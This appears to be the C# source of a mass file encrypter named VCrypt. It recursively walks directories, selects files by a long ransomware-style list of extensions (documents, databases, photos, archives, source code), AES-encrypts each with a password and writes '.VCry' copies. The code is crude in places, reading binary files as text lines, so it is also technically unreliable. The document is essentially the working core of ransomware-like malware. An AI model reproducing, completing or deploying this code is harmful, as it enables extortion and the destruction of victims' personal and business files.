using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;

namespace VCrypt.Enc.FileEnc
{
    internal class FileEncrypter
    {
        private static readonly string[] FileExtensions = new string[] //the things that has too be added lol
        {
        "7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite",
        "sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd",
        "wps", "csv", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd", "pdf",
        "vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf",
        "kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay",
        "bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif",
        "iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw",
        "orf", "pef", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf",
        "srw", "x3f", "tga", "tiff", "tif", "ai", "3g2", "3gp",
        "asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf",
        "vob", "wmv", "lnk", "png", "php", "mov", "cs", "js", "cpp", "h", "html", "jpg",
        "jpeg", "c", "h"
        };

        public static void mkf(string stf, string fnm, string pss)
        {
            log _log = new log();
            AES aes = new AES();
            var step1 = bytes(stf);
            _log.FileLog(step1, Environment.CurrentDirectory + "\\Step1 - Hex.txt");
            var step2 = aes.Encrypt(step1, pss);
            _log.FileLog(step2, Environment.CurrentDirectory + "\\Step1 - AES.txt");
            File.WriteAllText($"{fnm}.VCry", string.Join("\r\n", new[] { step2 }));
        }

        public static string B64encrypt(string s)
        {
            byte[] pb = Encoding.UTF8.GetBytes(s);
            string encoded = Convert.ToBase64String(pb);
            return encoded;
        }

        public static string bytes(string inse)
        {
            string decString = inse;
            byte[] bytes = Encoding.Default.GetBytes(decString);
            string hexString = BitConverter.ToString(bytes);
            hexString = hexString.Replace("-", "\n");
            return hexString;
        }





        public static string B64decrypt(string e)
        {
            byte[] enc = Convert.FromBase64String(e);
            string pt = Encoding.UTF8.GetString(enc);
            return pt;
        }

        public static void FileEncryption(string password, string path)
        {
            string[] directories = Directory.GetDirectories(path);
            
            //Console.WriteLine("Folders in the selected drive:");
            foreach (string directory in directories)
            {
               //DirectoryInfo dir = new DirectoryInfo(directory);

                try
                {
                    using (var progress = new progressBar())
                    {
                        
                        
                        IEnumerable<string> items = from file in Directory.EnumerateFiles(directory, "*.*")
                                                    where FileExtensions.Any((string x) => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))
                                                    select file;
                        int i = 0;
                        foreach (var itm in items)
                        {

                            //Console.Write($"\nNow encrypting file: {itm} | Current dir: {directory}");
                            
                            progress.Report((double)i / items.Count());
                            string[] Stringedbytes = File.ReadAllLines(itm);
                            mkf(string.Join("", Stringedbytes), itm, password);
                            i++;
                            Console.Title = $"{i} file(s) have been encrypted in {directory}";
                            if (i == items.Count())
                            {
                                Console.WriteLine("Done!");
                                i = 0;
                                GC.Collect();
                                continue;
                            }
                        }

                    }
                } catch (Exception e) {
                    Console.WriteLine(e);
                }
                
            }


            
        }
    }
}
